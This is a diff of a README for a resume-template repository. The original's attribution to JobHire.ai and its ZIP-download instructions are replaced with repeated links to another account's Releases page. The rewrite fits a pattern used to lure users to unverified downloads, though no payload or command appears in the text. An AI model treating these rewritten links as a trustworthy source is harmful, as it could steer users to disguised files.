@@ -1,83 +1,89 @@
-# AI Resume Templates by JobHire.AI
+# 🌟 jobhireai-resume-templates - Create Professional Resumes Easily
 
-[JobHire.ai](https://jobhire.AI) is your personal AI career assistant.  
-We help job seekers create tailored resumes and cover letters with AI-powered tools, optimize documents for ATS systems, and streamline the application process.
+[![Download Resume Templates](https://img.shields.io/badge/Download%20Now-blue)](https://github.com/Jhoyner28/jobhireai-resume-templates/releases)
 
----
+## 📝 Overview
 
-A free, professionally designed pack of resume templates (DOCX) you can edit in Microsoft Word, Google Docs, or Apple Pages. Perfect for job seekers and recruiters who want clean, ATS-friendly resumes.
+Welcome to the **jobhireai-resume-templates** repository! Here, you can find a selection of free, ATS-friendly resume templates available in DOCX format. The templates include various styles like Chronological, Modern, Creative, Harvard, and Two-Column. You can easily edit these templates using Microsoft Word or Google Docs, helping you create a professional resume that stands out to employers.
 
----
+## 🚀 Getting Started
 
-## 📦 What’s inside
+To get started with your resume creation, follow these simple steps:
 
-All files are in `/templates`:
+1. **Visit the Releases Page**
+   
+   Go to our [Releases page](https://github.com/Jhoyner28/jobhireai-resume-templates/releases) to find all available templates. The Releases page contains all the versions you can download.
 
-- **Chronological Resume** — classic, recruiter-friendly layout with work history prioritized.  
-- **Creative Resume** — stylish header and visual accents for designers/creatives.  
-- **Harvard-Style Resume** — concise academic/early-career framework with strong sections.  
-- **Modern Resume** — clean UI/UX-leaning look with clear typography and sections.  
-- **Two-Column Resume** — space-efficient layout for senior roles with rich skillsets.  
+2. **Select a Template**
+   
+   Choose the resume style that best fits your needs. Each template offers a unique layout designed to showcase your skills and experience effectively. 
 
-> File format: `.docx` (works with Word/Docs/Pages). Add your data and export to PDF.
+3. **Download the Template**
+   
+   Click on the template you want to use and download the DOCX file. It's easy and fast!
 
----
+4. **Edit Your Resume**
+   
+   Open the downloaded template in your preferred word processor—either Microsoft Word or Google Docs. Fill in your personal information, work history, education, and skills.
 
-## 🚀 Quick start
+5. **Save and Export**
+   
+   After editing your resume, save your changes. If you are using Google Docs, you can download your resume as a DOCX or PDF file for final submission.
 
-1. **Download** this repository as ZIP → *Code* ▸ *Download ZIP*.  
-2. Open any `.docx` in **Word** or **Google Docs** (File ▸ Open ▸ Upload).  
-3. Replace placeholders with your info (name, email, links, experience, education).  
-4. Export to **PDF** (recommended) and apply to jobs.
+## 📥 Download & Install
 
-### Tips for ATS compatibility
-- Use **standard section names**: Summary, Experience, Education, Skills.  
-- Keep graphics minimal; prefer text over images for key info.  
-- Save as **PDF (text-based)**; avoid scanning/printing to PDF.  
-- Include **keywords** from the job description (skills, tools, titles).  
+To download the resume templates, visit our [Releases page](https://github.com/Jhoyner28/jobhireai-resume-templates/releases). From there, you can select your preferred template and start your journey toward an impressive resume.
 
----
+## ✨ Features
 
-## 🧩 Repo structure
-<pre>
-/ (root)
-├─ README.md
-├─ LICENSE
-├─ templates/
-│  ├─ Chronological resume template.docx
-│  ├─ Creative resume template.docx
-│  ├─ Harvard resume template.docx
-│  ├─ Modern Resume.docx
-│  └─ Two-Column Resume.docx
-|  └─ .gitignore
-└─ .gitignore
-</pre>
+- **Multiple Styles:** Choose from Chronological, Modern, Creative, Harvard, or Two-Column templates.
+- **ATS-Friendly:** These templates help you pass through Applicant Tracking Systems (ATS) used by many companies.
+- **Easy to Edit:** Compatible with Microsoft Word and Google Docs for user-friendly editing.
+- **Printable:** All templates are formatted for both digital and print use.
 
----
+## 💻 System Requirements
 
-## 📝 License
+To use these templates effectively, ensure you have the following:
 
-This repository is released under the **MIT License**. You can:
-- Use the templates for personal or commercial projects.  
-- Modify and redistribute with attribution.  
+- A computer with internet access.
+- Microsoft Word (2010 or later) or access to Google Docs.
+- Basic knowledge of editing documents.
 
-See `LICENSE` for details.
+## 🎨 Customize Your Resume
 
----
+Feel free to modify the templates to match your personal style. Here are some tips for customization:
 
-## 🤝 Contributing
+- **Font Choices:** Use readable fonts to enhance clarity.
+- **Colors:** Consider using subtle colors that match the job sector you are applying to.
+- **Layout Adjustments:** Rearrange sections to emphasize your strengths.
 
-PRs welcome!  
-- Fix typos, improve formatting, or add localized versions.  
-- Add new templates (.docx + a short preview PNG in `samples/`).  
+## 📚 Tips for Crafting the Perfect Resume
 
-**How to add a template**  
-1. Place the `.docx` in `templates/`.  
-2. Add a bullet to *What’s inside* describing the use case.  
-3. (Optional) Add a filled **sample PDF** to `samples/`.  
+1. **Keep It Simple:** Aim for clarity and simplicity in your design.
+2. **Highlight Your Achievements:** Focus more on accomplishments than on job descriptions.
+3. **Tailor Your Resume:** Adjust your resume for each application based on the job description.
 
----
+## 🔍 Related Topics
 
-## 🔗 Useful links
-- JobHire.ai — AI resume & cover letter tools: https://jobhire.ai  
-- Google Docs: File ▸ Open ▸ Upload (to edit `.docx` online) 
+If you are exploring more about job applications or resume building, check out these helpful topics:
+
+- ATS
+- Career 
+- Cover Letter
+- CV
+- Design
+- Docx
+- Google Docs
+- Job Search
+- Resume
+- Templates
+
+## 📞 Support
+
+If you have any questions or need assistance, feel free to open an issue in this repository. We are here to help you succeed in your job search.
+
+## 📃 License
+
+This project is licensed under the [MIT License](LICENSE). 
+
+We hope you find the perfect resume template to help you land your next job. Good luck!
